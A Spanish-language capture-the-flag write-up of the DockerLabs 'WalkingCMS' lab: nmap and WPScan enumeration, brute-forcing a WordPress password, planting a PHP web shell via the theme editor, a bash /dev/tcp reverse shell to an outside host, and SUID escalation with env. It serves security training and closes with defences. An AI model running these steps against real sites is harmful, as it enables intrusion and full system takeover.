# WalkingCMS — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 09/04/2024  
**Técnicas:** WordPress · WPScan · Reverse Shell · Theme Editor · File Injection · SUID · GTFOBins

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración WordPress](#2-enumeración-wordpress)
3. [Fuerza bruta WordPress — WPScan](#3-fuerza-bruta-wordpress--wpscan)
4. [File Injection — Reverse Shell](#4-file-injection--reverse-shell)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos el laboratorio:

```bash
sudo bash auto_deploy.sh walkingcms.tar
```

> IP asignada: `172.17.0.2`

Realizamos un escaneo profundo:

```bash
sudo nmap -sS -sSC -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN Puertos
```

Resultado:

```text
80/tcp open http
```

Accedemos al servidor web y observamos únicamente la página por defecto de Apache.

---

## 2. Enumeración WordPress

Enumeramos directorios:

```bash
dirb http://172.17.0.2
```

Resultado:

```text
/wordpress/
```

La aplicación utiliza WordPress.

Utilizamos WPScan para enumerar usuarios, plugins y temas:

```bash
wpscan --url http://172.17.0.2/wordpress/ --enumerate u,vp
```

Resultado:

```text
Usuario encontrado: mario
```

---

## 3. Fuerza bruta WordPress — WPScan

Realizamos fuerza bruta sobre el usuario identificado:

```bash
wpscan --url http://172.17.0.2/wordpress/ \
--enumerate -U mario \
-P /usr/share/wordlists/rockyou.txt
```

Resultado:

```text
Username: mario
Password: love
```

Accedemos al panel administrativo de WordPress:

```text
http://172.17.0.2/wordpress/wp-login.php
```

---

## 4. File Injection — Reverse Shell

Dentro del panel de administración utilizamos el editor de temas.

Editamos:

```text
Appearance → Theme File Editor → index.php
```

Añadimos una WebShell PHP:

```php
<?php
system($_GET['cmd']);
?>
```

Guardamos los cambios y comprobamos ejecución de comandos:

```text
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=whoami
```

Resultado:

```text
www-data
```

Nos ponemos en escucha:

```bash
sudo nc -lvnp 443
```

Ejecutamos una reverse shell Bash:

```text
http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.26/443 0>&1'
```

Obtenemos acceso remoto:

```bash
whoami
www-data
```

---

## 5. Escalada de privilegios

Intentamos enumerar permisos sudo:

```bash
sudo -l
```

Sin resultados útiles.

Buscamos binarios SUID:

```bash
find / -perm -4000 -user root 2>/dev/null
```

Resultado relevante:

```text
/usr/bin/env
```

Consultamos GTFOBins y ejecutamos:

```bash
/usr/bin/env /bin/sh -p
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| WordPress accesible públicamente | Superficie de ataque expuesta |
| Contraseña débil WordPress | Acceso administrador |
| Theme Editor habilitado | Ejecución remota de código |
| Reverse Shell PHP | Acceso interactivo al sistema |
| Binario SUID vulnerable | Escalada a root |

**Para defenderse:**

- Aplicar políticas robustas de contraseñas.
- Deshabilitar el editor de archivos en WordPress.
- Restringir permisos sobre archivos PHP críticos.
- Auditar binarios SUID peligrosos.
- Limitar ejecución de comandos desde aplicaciones web.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
